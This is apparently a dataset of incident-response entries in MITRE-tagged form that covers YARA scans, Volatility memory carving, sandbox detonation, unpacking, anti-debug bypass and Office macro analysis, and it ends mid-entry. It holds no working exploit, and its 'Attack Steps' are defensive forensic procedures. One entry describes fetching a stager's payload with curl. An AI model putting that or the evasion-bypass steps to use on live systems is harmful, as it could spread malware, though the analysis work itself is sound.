- **Attack Type**: Memory Inspection
- **Target**: Windows Host
- **Vulnerability**: Live ransomware payload
- **MITRE**: T1486 (Data Encrypted for Impact)
- **Impact**: Identify ransomware memory resident
- **Tools**: YARA, Volatility
- **Scenario**: Analysts check if a machine was infected with known ransomware during incident response
- **Attack Steps**: 1. Capture a RAM dump using DumpIt or Belkasoft RAM Capturer.2. Load known ransomware YARA rules (e.g., ransomware.yar).3. Run Volatility’s yarascan on the image.4. Identify the process(es) tied to matched memory offsets using psscan, malfind.5. Dump memory of relevant processes for inspection and file carving.6. Store matching strings and offsets as IOC in case notes.
- **Detection**: Memory signatures and live process traces
- **Solution**: Restore from clean backup; scan others
- **Tags**: yara, ransomware, memory-scanning

## Use of YARA in Detecting Beaconing Malware on Disk

- **Attack Type**: Static Payload Detection
- **Target**: Windows Filesystem
- **Vulnerability**: Beacon dropper
- **MITRE**: T1071.001 (Web C2)
- **Impact**: Detect stealthy C2 malware
- **Tools**: YARA
- **Scenario**: Investigators review a suspected backdoor executable dropped via phishing
- **Attack Steps**: 1. Locate suspicious .exe file through file listings or timeline tools.2. Apply YARA rules tailored to beaconing malware (e.g., Empire, Cobalt Strike).3. Match results indicate the malware family or technique used.4. Extract strings using strings or PE analysis tools to confirm beaconing behavior.5. Note any C2 domains or base64 patterns in the file body.6. Share matched rules with other IR teams.
- **Detection**: Disk YARA + static string analysis
- **Solution**: Quarantine and reverse engineer
- **Tags**: yara, beacon, cobalt-strike, ir

## Identify Memory-Resident Backdoor via YARA Rules

- **Attack Type**: Memory Carving
- **Target**: Windows Host
- **Vulnerability**: In-memory payload
- **MITRE**: T1055 (Process Injection)
- **Impact**: Catch fileless persistence mechanism
- **Tools**: YARA, Volatility
- **Scenario**: Analysts hunt for fileless malware after suspicious outbound traffic is observed
- **Attack Steps**: 1. Dump live memory from host showing beaconing activity.2. Use YARA rules with focus on fileless backdoor signatures.3. Scan memory image using Volatility’s yarascan plugin.4. Cross-reference offset with running processes and injects using malfind.5. Dump process memory and reconstruct payload using tools like HxD or PE Bear.6. Isolate payload and confirm C2 activity via extracted strings.
- **Detection**: YARA scan + process inspection
- **Solution**: Isolate host, kill memory-resident malware
- **Tags**: memory-only, yara, fileless, backdoor

## Detecting Cobalt Strike DLL Loader in RAM via YARA

- **Attack Type**: DLL Memory Scan
- **Target**: Windows Host
- **Vulnerability**: Injected DLL
- **MITRE**: T1055.002 (DLL Injection)
- **Impact**: Identify stealthy C2 implants
- **Tools**: YARA, Volatility
- **Scenario**: An alert indicates suspicious lateral movement involving DLL injection
- **Attack Steps**: 1. Capture system memory from affected endpoint.2. Apply specific YARA rules targeting Cobalt Strike DLL loaders.3. Run the YARA scan with Volatility and collect matched regions.4. Investigate parent process (e.g., svchost.exe, explorer.exe).5. Dump DLL payload and inspect for known loader patterns.6. Compare against previous incident hashes or IOC databases.
- **Detection**: Memory YARA + DLL injection correlation
- **Solution**: Kill and block lateral payloads
- **Tags**: cobalt-strike, dll, yara, lateral

## Identify Known Ransom Note Strings with YARA

- **Attack Type**: String-Based Payload Matching
- **Target**: Windows Filesystem
- **Vulnerability**: Encrypted note
- **MITRE**: T1486 (Data Encrypted for Impact)
- **Impact**: Confirm ransomware presence
- **Tools**: YARA
- **Scenario**: A machine shows signs of compromise, ransom notes might exist in hidden folders
- **Attack Steps**: 1. Build YARA rule with known ransom note strings (e.g., "Your files are encrypted").2. Run recursive YARA scan on suspected folders like C:\Users\Public, Temp, etc.3. If match is found, isolate the file, and collect timestamps and metadata.4. Identify associated processes using timeline or jump list analysis.5. Extract ransom note and compare to known variants (REvil, Conti).6. Add to case report and use as IOC.
- **Detection**: String match + timestamp correlation
- **Solution**: Use note metadata to identify strain
- **Tags**: ransomware, note, string-yara

## Real-Time Disk Scan for Known Malware Artifacts

- **Attack Type**: Live System Analysis
- **Target**: Windows Host
- **Vulnerability**: Real-time malware
- **MITRE**: T1204.002 (Malicious File)
- **Impact**: Fast malware detection during IR
- **Tools**: YARA
- **Scenario**: While triaging an active machine, analyst wants to check for specific threats
- **Attack Steps**: 1. Install YARA on triage machine or use portable version.2. Run scan directly on disk paths (e.g., %APPDATA%, %TEMP%).3. Use known threat YARA rules (APT packs, crimeware, etc).4. If matches found, pause or kill corresponding processes.5. Quarantine and hash matched files.6. Continue broader disk and memory inspection.
- **Detection**: Real-time YARA match
- **Solution**: Quarantine + kill process tree
- **Tags**: yara, incident-response, live-triage

## Extract Malware via YARA Scan on Disk

- **Attack Type**: YARA Matching in Disk
- **Target**: Workstation
- **Vulnerability**: Malicious file drop
- **MITRE**: T1059, T1204
- **Impact**: Malware detection and signature identification
- **Tools**: YARA, PEStudio, yara-rules
- **Scenario**: Analysts want to find disk-resident malware by matching signatures using YARA against malicious PE files.
- **Attack Steps**: 1. Begin by downloading updated YARA rules from open-source repositories like yara-rules.2. Navigate to a suspected directory (like C:\Users\Public\Downloads) where malware may exist.3. Run a recursive YARA scan on that directory using a command like yara -r rules/index.yar C:\Users\Public\Downloads.4. Analyze matched files and extract them manually using file explorer or command-line.5. Upload the samples to VirusTotal or perform static analysis in PEStudio or Ghidra.
- **Detection**: Antivirus logs, file integrity monitoring
- **Solution**: Use YARA scanning regularly on disk and block hashes with EDR
- **Tags**: yara, pefile, diskforensics

## Memory Dump Analysis for Malicious Executables

- **Attack Type**: Carving Payloads from Memory Dumps
- **Target**: Endpoint
- **Vulnerability**: Code injection
- **MITRE**: T1055
- **Impact**: Identification of memory-resident payloads
- **Tools**: Volatility, malfind, dlllist, dlldump
- **Scenario**: The analyst needs to recover in-memory malware from a compromised machine where on-disk indicators were wiped.
- **Attack Steps**: 1. Use Volatility with the appropriate memory profile for the dump.2. Run volatility -f mem.dmp --profile=Win10x64 malfind to find suspicious code injections.3. Identify anomalies in memory such as injected code or hollowed processes.4. Use dlldump to carve out suspicious DLLs from memory for analysis.5. Run strings, hashing, and YARA on dumped DLLs to analyze intent.6. Cross-reference hash with threat intelligence platforms.
- **Detection**: Memory forensic tools like Volatility
- **Solution**: Deploy memory scanning and script-based monitoring
- **Tags**: memoryforensics, volatility, dllanalysis

## Automated Malware Extraction in Sandbox

- **Attack Type**: Dynamic Malware Analysis
- **Target**: Executable
- **Vulnerability**: Lack of sandbox evasion
- **MITRE**: T1059, T1027
- **Impact**: Full behavioral profile of malware
- **Tools**: Any.run, Cuckoo Sandbox
- **Scenario**: Analyst receives an unknown executable and wants to monitor behavior and payloads dynamically.
- **Attack Steps**: 1. Upload the unknown sample to a sandbox environment like Any.run or Cuckoo.2. Observe process creation, registry changes, network traffic, and dropped files.3. Let the malware run to completion to ensure all behaviors are triggered.4. Download dropped payloads or memory dumps from the sandbox.5. Extract indicators like C2 domains, mutexes, and artifacts.6. Validate extracted artifacts against threat databases.
- **Detection**: Sandbox reports, behavior graph
- **Solution**: Improve sandbox coverage and alert on unique behaviors
- **Tags**: sandbox, cuckoo, behavioralanalysis

## Using Ghidra to Extract Obfuscated Malware Code

- **Attack Type**: Static Malware Analysis
- **Target**: Binary
- **Vulnerability**: Obfuscation, packed malware
- **MITRE**: T1140, T1060
- **Impact**: Code structure and payload logic revealed
- **Tools**: Ghidra, PEiD, Detect It Easy
- **Scenario**: A reverse engineer is tasked with understanding obfuscated payloads embedded in an EXE.
- **Attack Steps**: 1. Load the suspicious EXE in PEiD or Detect It Easy to determine packing or obfuscation methods.2. Use unpacking tools if necessary (e.g., UPX, Unpacker plugins).3. Import the unpacked binary into Ghidra and let it analyze the functions.4. Navigate to main() or suspicious API calls like VirtualAlloc, CreateRemoteThread.5. Use cross-references and decompiler view to reverse code flow and identify payload logic.6. Extract decryption routines or dropped strings (e.g., URLs, file paths).
- **Detection**: Manual disassembly and decompilation
- **Solution**: Defensive unpacking and static scanning
- **Tags**: ghidra, malwareunpacking, decompiler

## Detecting Malware through SRUM Network Usage

- **Attack Type**: Behavioral Payload Identification
- **Target**: System
- **Vulnerability**: Covert C2 via normal processes
- **MITRE**: T1071, T1041
- **Impact**: Identification of stealthy data exfiltration
- **Tools**: SRUM, SRUM-Dump, Event Viewer
- **Scenario**: Investigators suspect a payload was beaconing to an external C2 server during compromise.
- **Attack Steps**: 1. Export SRUM database (C:\Windows\System32\sru\SRUDB.dat) from the affected system.2. Use tools like srum-dump.py to parse the SRUDB file.3. Focus on the Network Usage and App Timeline tables to identify processes communicating externally.4. Map these back to suspicious binaries found on disk or in memory.5. Identify any abnormal frequency or burst traffic periods.6. Tag those processes for YARA scanning or further analysis.
- **Detection**: SRUM usage logs, NetFlow
- **Solution**: SRUM monitoring and correlation with Net logs
- **Tags**: srum, networkforensics

## Rebuilding Dropped Files from Prefetch Metadata

- **Attack Type**: Disk Artifact Correlation
- **Target**: Workstation
- **Vulnerability**: Deleted executable
- **MITRE**: T1070.004
- **Impact**: Recovery of previously deleted malware
- **Tools**: PECmd, FTK Imager, Prefetch Parser
- **Scenario**: Investigators want to confirm the use of a dropped payload using prefetch files on the system.
- **Attack Steps**: 1. Extract .pf files from C:\Windows\Prefetch using FTK or copy manually.2. Use PECmd to parse the .pf files and identify executables that were run recently.3. Check for unusual executables (e.g., invoice123.exe, svchost-new.exe).4. Check run count and last execution time.5. If executable is deleted, correlate with MFT to recover.6. Recover full path, possible DLLs accessed, and disk location.
- **Detection**: Prefetch + MFT combo analysis
- **Solution**: Use file execution artifacts as indicators
- **Tags**: prefetch, PEcmd, diskrecovery

## Carving Payloads from $J (NTFS Change Journal)

- **Attack Type**: File Carving
- **Target**: NTFS Disk
- **Vulnerability**: Deleted artifact
- **MITRE**: T1070, T1485
- **Impact**: Recovery of attacker files that were deleted
- **Tools**: MFTECmd, UsnJrnl2Csv
- **Scenario**: Payload was dropped and deleted, but DFIR wants to recover it via NTFS artifacts.
- **Attack Steps**: 1. Use MFTECmd to extract Master File Table from the suspect drive image.2. Analyze $J (NTFS Change Journal) for signs of created-and-deleted binaries.3. Identify suspicious filenames and their timestamps.4. Use timestamps to correlate with $MFT and locate deleted sectors.5. Carve out file contents using forensic tools like Autopsy or X-Ways.6. Hash and scan recovered payloads with antivirus and threat intel.
- **Detection**: NTFS metadata timeline analysis
- **Solution**: Monitor file journaling systems
- **Tags**: filecarving, usnjrnl, NTFSforensics

## Automated YARA Matching via KAPE

- **Attack Type**: YARA Matching
- **Target**: Endpoint
- **Vulnerability**: Known signatures on disk
- **MITRE**: T1204
- **Impact**: Automated IOC detection
- **Tools**: KAPE, YARA, EZ Tools
- **Scenario**: A field analyst wants to run YARA scans across endpoints automatically.
- **Attack Steps**: 1. Configure YARA modules in KAPE by adding a custom YARA collector.2. Load YARA rules in Modules\Targets\YaraScan.mkape.3. Run KAPE against a mounted image or live system with syntax like:kape.exe --tsource C:\ --target YaraScan --toutput D:\Output4. Once scan is complete, inspect output .json and .txt files.5. Investigate matched files further using AV or sandboxing tools.6. Export hashes or matches to share with SOC.
- **Detection**: KAPE log files and scan output
- **Solution**: Deploy KAPE agents for IR
- **Tags**: yara, kape, automation

## Payload Recovery via Malfind and YARA

- **Attack Type**: Hybrid Memory Analysis
- **Target**: RAM
- **Vulnerability**: Process injection
- **MITRE**: T1055
- **Impact**: Identifying injected memory malware
- **Tools**: Volatility, YARA
- **Scenario**: Malware is injected into a remote process and not visible on disk.
- **Attack Steps**: 1. Use volatility -f mem.raw --profile=Win7SP1x64 malfind to find suspicious memory regions.2. Dump those memory regions using procdump or dlldump plugins.3. Run YARA locally on those memory-dumped DLLs to check for malware traits.4. If match is positive, extract strings, configs, and embedded payloads.5. Link PID and executable to potential user behavior or persistence methods.6. Submit payloads to sandbox for dynamic behavior.
- **Detection**: Memory YARA + volatility dump
- **Solution**: Memory scanning policy updates
- **Tags**: malfind, injection, YARA

## Static Signature Identification with PEStudio

- **Attack Type**: Static Analysis
- **Target**: PE Binary
- **Vulnerability**: Unknown binary
- **MITRE**: T1059
- **Impact**: Classification of potentially malicious executable
- **Tools**: PEStudio, Strings, VT
- **Scenario**: Analyst examines PE file dropped via phishing email to validate threat.
- **Attack Steps**: 1. Open suspect .exe in PEStudio.2. Analyze imported APIs — red flags include VirtualAlloc, WriteProcessMemory.3. Look for suspicious section names (.textb, .xyz) or overlays.4. View embedded strings, paths, and URLs.5. Check VirusTotal score from within PEStudio.6. Generate a quick IOC list based on indicators found.
- **Detection**: Static traits flagged in PEStudio
- **Solution**: Enforce attachment scanning with static tools
- **Tags**: pestudio, staticmalware

## Extracting Packed Malware Payloads from Disk

- **Attack Type**: Static Malware Analysis
- **Target**: Windows Host
- **Vulnerability**: Packed Executable
- **MITRE**: T1027
- **Impact**: Payload Extraction, Unpacking
- **Tools**: PeStudio, UPX, Ghidra
- **Scenario**: Investigating a system with suspected packed malware sample stored on disk.
- **Attack Steps**: 1. Identify the suspicious executable file using hash-based search or detection alerts.2. Open the file in PeStudio to check for indicators of packing (e.g., few imports, high entropy).3. Attempt to unpack the binary using tools like UPX (upx -d sample.exe).4. If it fails, load the executable in a debugger (e.g., x64dbg) and step through to locate the Original Entry Point (OEP).5. Dump memory at the OEP using Scylla or OllyDump plugin.6. Rebuild the import address table.7. Analyze the unpacked payload in Ghidra to understand behavior.8. Note key indicators for future YARA or detection rule writing.
- **Detection**: PE structure anomalies, entropy-based alerts
- **Solution**: Monitor for high entropy binaries, alert on packed signature matches
- **Tags**: Malware Analysis, UPX, Packed Binaries

## Dynamic Analysis of Malware via Sandbox

- **Attack Type**: Dynamic Malware Analysis
- **Target**: Windows Malware Sample
- **Vulnerability**: Obfuscated Binary
- **MITRE**: T1040, T1055
- **Impact**: Full behavior profiling
- **Tools**: Any.run, Cuckoo Sandbox
- **Scenario**: Analyst investigates an unknown sample in a safe environment to understand its behavior.
- **Attack Steps**: 1. Set up a virtual machine with Cuckoo Sandbox or use online sandbox like Any.run.2. Submit the malware sample and observe automated behavior.3. Track network connections, file system changes, process activity, and registry modifications.4. Export IOCs such as domain names, IPs, file paths, and mutexes.5. Compare results with static analysis for overlap.6. Store the full sandbox report for later correlation with endpoint detection logs.
- **Detection**: Network traffic, behavioral logging
- **Solution**: Use sandbox evasion detection and correlate dynamic behaviors
- **Tags**: Sandbox, Malware Analysis, IOCs

## Carving a DLL from a Memory Dump

- **Attack Type**: Memory Payload Extraction
- **Target**: Windows Memory Dump
- **Vulnerability**: Code Injection (DLL)
- **MITRE**: T1055.001
- **Impact**: Payload Discovery, Memory Analysis
- **Tools**: Volatility, PE-sieve, dlldump
- **Scenario**: Responding to a memory dump of a compromised machine suspected to have malware-injected DLLs.
- **Attack Steps**: 1. Load the memory dump into Volatility using volatility -f mem.dmp --profile=Win7SP1x64 dlllist.2. Identify suspicious DLLs injected into common processes like svchost or explorer.3. Use malfind plugin to locate injected code regions.4. Dump the memory sections with dlldump.5. Use PE-sieve to scan for manually mapped or hollowed DLLs.6. Save and analyze the dumped DLL in Ghidra or IDA.7. Compare against known-good baselines to detect changes or anomalies.8. Extract indicators like export functions or embedded strings.
- **Detection**: Abnormal DLL in memory
- **Solution**: Volatility, hash comparison
- **Tags**: Memory Forensics, DLL, Injection

## Detecting Malware via YARA in Disk Images

- **Attack Type**: YARA Detection
- **Target**: Disk Image
- **Vulnerability**: Known Malware Signatures
- **MITRE**: T1105
- **Impact**: Artifact Detection
- **Tools**: YARA, FTK Imager, Bulk Extractor
- **Scenario**: Analysts scan acquired disk image for known or custom malware signatures.
- **Attack Steps**: 1. Acquire the forensic disk image of the affected system.2. Mount the image using FTK Imager or similar tools.3. Extract suspicious directories (e.g., C:\Users\AppData).4. Use YARA with known rulesets (yara -r malware_rules.yar extracted_folder/).5. Review matching files and confirm hit relevance.6. Refine rules to detect obfuscated variants.7. Document the findings and extract samples for further analysis.
- **Detection**: YARA matches on disk artifacts
- **Solution**: Apply YARA rulesets on forensic copies
- **Tags**: YARA, Disk Image, Forensics

## Extracting In-Memory EXEs with Volatility

- **Attack Type**: Memory Malware Carving
- **Target**: Windows Host
- **Vulnerability**: Memory Injection
- **MITRE**: T1055
- **Impact**: Memory-based Malware Discovery
- **Tools**: Volatility, malfind, procdump
- **Scenario**: Malware injected as in-memory executable detected in volatile memory dump.
- **Attack Steps**: 1. Open the memory image using Volatility.2. Run malfind to locate injected code (look for RWX pages).3. Use procdump or dlldump to extract the malicious region.4. Save dumped binary and load in PEStudio or Ghidra.5. Check for common indicators like suspicious imports or packers.6. Run hash-based comparison against known malware DBs (VirusTotal, Hybrid Analysis).7. Document strings, mutexes, and configuration if embedded.8. Create YARA signature from extracted sample.
- **Detection**: Detection of RWX regions, anomalies
- **Solution**: Malfind, procdump, AV scan
- **Tags**: Memory Carving, Malware

## Static Analysis of Obfuscated JavaScript Dropper

- **Attack Type**: Static Analysis
- **Target**: JavaScript Dropper
- **Vulnerability**: Obfuscation, Download
- **MITRE**: T1059.007
- **Impact**: Initial Stage Payload Discovery
- **Tools**: JSDetox, CyberChef, Notepad++
- **Scenario**: Investigation of a malicious JavaScript dropper hidden in a compromised web archive.
- **Attack Steps**: 1. Locate the suspicious .js or .hta file using logs or AV alerts.2. Open it in JSDetox or a safe text viewer.3. Look for obfuscated functions, eval(), unescape(), and other suspicious constructs.4. Use CyberChef to deobfuscate encoded payloads (e.g., base64, hex).5. Trace variable reassignment to reconstruct download URLs.6. Extract command-and-control addresses and dropped payload links.7. Create detection rules for encoded strings.8. Retain decoded script as evidence.
- **Detection**: Obfuscated strings and eval execution
- **Solution**: Static code review, decoding
- **Tags**: JavaScript, Dropper, Obfuscation

## Disassembling Cobalt Strike Beacon Payload

- **Attack Type**: Static Analysis
- **Target**: Windows Malware
- **Vulnerability**: Cobalt Strike
- **MITRE**: T1027, T1059
- **Impact**: Threat Actor Payload Mapping
- **Tools**: Ghidra, IDA Pro, Detect It Easy
- **Scenario**: Analyst reverse engineers a suspected Cobalt Strike beacon DLL.
- **Attack Steps**: 1. Load the beacon DLL into Detect It Easy to confirm compiler and packer type.2. Unpack if necessary using manual unpacking techniques.3. Load the binary in Ghidra or IDA Pro.4. Identify key function names such as beacon, config, xor, sleep.5. Locate encrypted configuration block and decryption stub.6. Extract indicators like C2, watermark, sleep timers.7. Map beacon capabilities (screenshot, process inject, etc.).8. Document threat profile for detection team.
- **Detection**: Encrypted configs, delayed sleep
- **Solution**: Reverse engineering, config extract
- **Tags**: Cobalt Strike, Beacon

## Analyzing In-Memory Shellcode via Dump

- **Attack Type**: Memory Shellcode Analysis
- **Target**: Windows Memory
- **Vulnerability**: Shellcode
- **MITRE**: T1106
- **Impact**: Shellcode Execution Detection
- **Tools**: Volatility, scdbg, x64dbg
- **Scenario**: Responders locate and decode shellcode executing in memory.
- **Attack Steps**: 1. Use Volatility's malfind to detect injected code.2. Extract the memory region using memdump or procdump.3. Convert to binary with tools like HxD or scdbg.4. Run the shellcode in emulated environment using scdbg.5. Identify API calls or network behavior from the shellcode.6. Optionally load into x64dbg for breakpoint analysis.7. Document decoded URLs, dropper URLs or attacker payloads.8. Feed findings into detection rules.
- **Detection**: Suspicious RWX segments
- **Solution**: Signature-based & heuristic emulation
- **Tags**: Shellcode, Memory, Reverse

## Extracting Embedded Payload from Office Macro

- **Attack Type**: Office Macro Analysis
- **Target**: Office File
- **Vulnerability**: VBA Macro
- **MITRE**: T1059.005
- **Impact**: Initial Payload Delivery
- **Tools**: oledump.py, olevba, OfficeMalScanner
- **Scenario**: Analysts investigate Office document with embedded malware via macros.
- **Attack Steps**: 1. Open the suspected Office file with oledump.py to locate macro streams.2. Extract macro code using olevba.3. Deobfuscate macro script to find dropped file or PowerShell payloads.4. Analyze shellcode or encoded payload within.5. If PowerShell is invoked, extract and decode it separately.6. Identify domains or IPs contacted.7. Determine whether payload is file-based or in-memory.8. Create detection signature for AV and mail filter.
- **Detection**: Macro obfuscation, PowerShell dropper
- **Solution**: Macro scanner, deobfuscation
- **Tags**: Office, Macro, Payload

## Carving Encrypted Malware Samples from RAM

- **Attack Type**: Memory Dump Carving
- **Target**: Windows RAM
- **Vulnerability**: Fileless Malware
- **MITRE**: T1027.005
- **Impact**: Bypass Disk Detection
- **Tools**: Volatility, binwalk, CyberChef
- **Scenario**: Malware sample encrypted on disk but active in memory.
- **Attack Steps**: 1. Suspect malware was encrypted and never written to disk.2. Use Volatility to scan for anomalies in running processes.3. Dump memory segments of high entropy processes using memdump.4. Use binwalk to detect and extract embedded files from dumped segments.5. Identify file headers and carve out .EXE or .DLL manually.6. If binary is encrypted, try base64, XOR or AES decoding via CyberChef.7. Load extracted binary into analysis tools.8. Extract IOCs and flag behavior.
- **Detection**: High entropy memory regions
- **Solution**: Memory dump and header scan
- **Tags**: RAM, Encrypted Payload

## Analyzing Malware Dropper Behavior

- **Attack Type**: Dropper Analysis
- **Target**: Endpoint
- **Vulnerability**: Social engineering delivery (phishing)
- **MITRE**: T1204 (User Execution)
- **Impact**: Initial infection and secondary stage payloads
- **Tools**: Cuckoo Sandbox, ProcMon, PEStudio
- **Scenario**: A suspicious EXE is found that initiates no visible behavior but creates a new executable silently.
- **Attack Steps**: 1. Start by isolating the dropper in a secure environment like a virtual machine. 2. Run the dropper while ProcMon monitors file and registry activity. 3. Observe if new files appear in AppData, Temp, or startup directories. 4. Open the dropper with PEStudio to inspect embedded resources, strings, and any suspicious sections. 5. Look for indicators like embedded PE files or self-extracting archive signs. 6. Use a hex editor to find magic bytes (MZ, PK) indicating a binary blob or zipped content. 7. Detonate in Cuckoo Sandbox and record whether a secondary payload is downloaded or written to disk. 8. Correlate this with network traffic to catch possible C2 communications. 9. Extract the dropped payload for further reverse engineering.
- **Detection**: File write monitoring, behavior-based sandboxing
- **Solution**: Block dropper execution via application whitelisting, and use behavioral detection
- **Tags**: malware, dropper, pe, sandbox, cuckoo

## Detecting Malware Obfuscation Techniques

- **Attack Type**: Obfuscation
- **Target**: Endpoint
- **Vulnerability**: Packed/obfuscated malware
- **MITRE**: T1027 (Obfuscated Files or Information)
- **Impact**: Bypasses static detection, evades AV
- **Tools**: x64dbg, CyberChef, PEiD
- **Scenario**: Malware sample appears as junk code but executes malicious activity in memory.
- **Attack Steps**: 1. Load the file in PEiD to detect packers or obfuscation frameworks (e.g., UPX, Themida). 2. If packed, unpack using the respective tool (e.g., UPX -d). 3. Disassemble in x64dbg to observe entry point and control flow. 4. Note any "jump" chains, dead code, or decoding loops. 5. Check for XOR or Base64 encoded payloads using CyberChef. 6. Set breakpoints at memory allocation APIs (VirtualAlloc, WriteProcessMemory) to catch in-memory decryption. 7. Let the sample run till payload gets decrypted, then dump memory. 8. Use Volatility to carve decrypted payload from RAM. 9. Analyze payload behavior separately.
- **Detection**: Entropy analysis, dynamic unpacking, string analysis
- **Solution**: Use YARA rules and behavior-based AV; flag packed files for deeper review
- **Tags**: malware, obfuscation, unpacking, x64dbg, PEiD

## Hybrid Analysis of Malware Payload

- **Attack Type**: Hybrid Behavioral Analysis
- **Target**: Endpoint
- **Vulnerability**: Polymorphic malware
- **MITRE**: T1059.001 (Command and Scripting Interpreter: PowerShell)
- **Impact**: Better visibility into complete attacker TTPs
- **Tools**: Cuckoo, IDA Free, Wireshark
- **Scenario**: Need to combine static and dynamic techniques to understand malware completely.
- **Attack Steps**: 1. Submit sample to Cuckoo to observe file, registry, and network behavior. 2. Record indicators like domain callbacks, mutexes, file paths. 3. Download the report and extract behavior trace. 4. Open the sample in IDA Free and find main functions. 5. Match Cuckoo behaviors with disassembled code logic. 6. Use Wireshark to capture and analyze any network traffic from sandbox execution. 7. Focus on POST/GET requests and DNS resolutions. 8. Check for encoded C2 traffic or beacon intervals. 9. Document IOCs and behaviors for detection rules.
- **Detection**: Network capture, sandbox logs, static/dynamic comparison
- **Solution**: Combine both analysis types; update signatures based on IOCs
- **Tags**: hybrid-analysis, cuckoo, idafree, ioc

## Dissecting a Stager Payload

- **Attack Type**: Stager Analysis
- **Target**: Endpoint
- **Vulnerability**: Payload delivered in stages
- **MITRE**: T1105 (Ingress Tool Transfer)
- **Impact**: Bypasses detection by separating payload into stages
- **Tools**: Fiddler, x64dbg, curl, Process Hacker
- **Scenario**: Attacker uses a stager to fetch full malware from external URL.
- **Attack Steps**: 1. Detonate the stager in a monitored VM. 2. Capture traffic using Fiddler or Wireshark. 3. Check for HTTP/HTTPS calls to suspicious URLs. 4. Use curl with the same URL to pull down full payload manually. 5. Analyze the payload with PEStudio and hash it. 6. In x64dbg, trace the initial shellcode or loader logic. 7. Check memory usage and injected modules via Process Hacker. 8. Dump memory to extract payload using Volatility. 9. Document persistence mechanisms added post-download.
- **Detection**: Network capture, endpoint file monitoring
- **Solution**: Block staging domains; alert on suspicious HTTP pull behavior
- **Tags**: stager, stage2, curl, dropper

## Reversing Payload with Anti-Debugging

- **Attack Type**: Anti-Debug
- **Target**: Endpoint
- **Vulnerability**: Anti-analysis malware
- **MITRE**: T1622 (Debugger Evasion)
- **Impact**: Obfuscates logic, thwarts reverse engineering
- **Tools**: ScyllaHide, x64dbg, OllyDbg
- **Scenario**: Payload crashes when run under debugger.
- **Attack Steps**: 1. Launch malware in x64dbg with ScyllaHide anti-anti-debug plugin. 2. Identify anti-debugging tricks like IsDebuggerPresent, CheckRemoteDebuggerPresent. 3. Patch these instructions or hook them to return false. 4. Resume execution and log API calls using debugger. 5. Analyze timing functions (GetTickCount, RDTSC) used to detect emulation. 6. Bypass or skip them with breakpoints or NOPs. 7. Extract decrypted payload when it becomes visible in memory. 8. Dump and hash the payload. 9. Compare behavior with non-debug runs to verify bypass success.
- **Detection**: API behavior monitoring, debugger plugin hooks
- **Solution**: Harden debugger setup and use anti-evasion plugins
- **Tags**: anti-debug, x64dbg, scyllahide, evasive-malware

## Detecting Encrypted Payload Droppers

- **Attack Type**: Encrypted Dropper
- **Target**: Endpoint
- **Vulnerability**: Encrypted payload
- **MITRE**: T1140 (Deobfuscate/Decode Files or Information)
- **Impact**: Payload hidden from disk and static scanners
- **Tools**: x64dbg, PE-bear, Detect-It-Easy
- **Scenario**: Payload encrypted inside EXE; decrypts at runtime.
- **Attack Steps**: 1. Load the binary in Detect-It-Easy to inspect entropy of sections. 2. High entropy in .data or unknown sections hints encryption. 3. Launch in x64dbg and set breakpoints at VirtualAlloc, RtlDecompressBuffer, etc. 4. Step over until decrypted data is written to memory. 5. Dump the memory region to disk. 6. Check for PE header to validate it’s a Windows executable. 7. Analyze dumped file in PE-bear for entry point and headers. 8. Reverse engineer decryption key/logic if needed. 9. Extract IOCs and possible embedded configurations.
- **Detection**: Entropy checks, memory dumps
- **Solution**: Dump after decryption, monitor decryption APIs
- **Tags**: encryption, dropper, volatility

## Identifying Payloads Hidden in Alternate Data Streams

- **Attack Type**: ADS Technique
- **Target**: Endpoint
- **Vulnerability**: File system misuse
- **MITRE**: T1564.004 (Hide Artifacts: NTFS ADS)
- **Impact**: Evades detection and persists quietly
- **Tools**: Streams.exe, FTK Imager, PowerShell
- **Scenario**: Payload embedded within alternate NTFS streams.
- **Attack Steps**: 1. Use dir /R in PowerShell to identify ADS attached to files. 2. Extract data from streams using more < file:stream or Streams.exe. 3. Hash and open the stream contents in PEStudio. 4. If it's a PE, extract and analyze it like any executable. 5. Launch FTK Imager and open the disk image or live disk. 6. Navigate NTFS metadata to view named streams. 7. Run the executable in a sandbox to observe behavior. 8. Correlate creation time and host process to detect delivery vector. 9. Write detection rule for ADS usage in malware.
- **Detection**: ADS detection tools, filesystem audit
- **Solution**: Monitor NTFS streams; restrict ADS via GPOs
- **Tags**: ads, ftk, streams.exe, ntfs

## Static Analysis of Malicious Office Payload

- **Attack Type**: Office Macro
- **Target**: Endpoint
- **Vulnerability**: Phishing
- **MITRE**: T1203 (Exploitation for Client Execution)
- **Impact**: User-triggered malware deployment
- **Tools**: oledump.py, OfficeMalScanner
- **Scenario**: A Word doc drops EXE after enabling macros.
- **Attack Steps**: 1. Open the .doc file using oledump.py to enumerate macro streams. 2. Analyze each stream for suspicious VBScript using the -s flag. 3. Decode base64 or hex-encoded commands embedded in macro. 4. Look for Shell, CreateObject, or WScript calls indicating execution. 5. Simulate the macro behavior in a safe VM. 6. Monitor registry keys or temp file writes. 7. Extract dropped EXE and hash it. 8. Submit it to VirusTotal or sandbox. 9. Block macro-enabled docs via email gateway.
- **Detection**: Macro extraction, sandbox macro execution
- **Solution**: Disable macros by default; use email filters
- **Tags**: office, macro, oledump, phishing

## AutoIt Script Payload Extraction

- **Attack Type**: Scripted Payload
- **Target**: Endpoint
- **Vulnerability**: Scripting engine abuse
- **MITRE**: T1059.005 (Command and Scripting Interpreter: Visual Basic)
- **Impact**: Hidden functionality, fast deployment
- **Tools**: Exe2Aut, AutoIt decompiler, x32dbg
- **Scenario**: Malware written in AutoIt scripting engine.
- **Attack Steps**: 1. Use Exe2Aut to extract AutoIt script from compiled EXE. 2. If encrypted, try AutoIt decompiler tools to recover source. 3. Review logic for malicious activity (file download, registry changes). 4. Check for obfuscation like chr() chains. 5. Trace the script’s execution flow manually. 6. Drop and run script in sandbox to see behavior. 7. Correlate activity with any dropped payloads. 8. Use x32dbg if needed for deeper memory behavior. 9. Block AutoIt script execution enterprise-wide.
- **Detection**: Script decompilation, behavior sandboxing
- **Solution**: Block AutoIt EXEs via application control
- **Tags**: autoit, exe2aut, script

## Extracting Payloads from WMI Events

- **Attack Type**: WMI Persistence
- **Target**: Endpoint
- **Vulnerability**: WMI abuse
- **MITRE**: T1047 (Windows Management Instrumentation)
- **Impact**: Stealthy persistence and payload execution
- **Tools**: WMI Explorer, Sysinternals Autoruns
- **Scenario**: Attacker hides script inside WMI event filter.
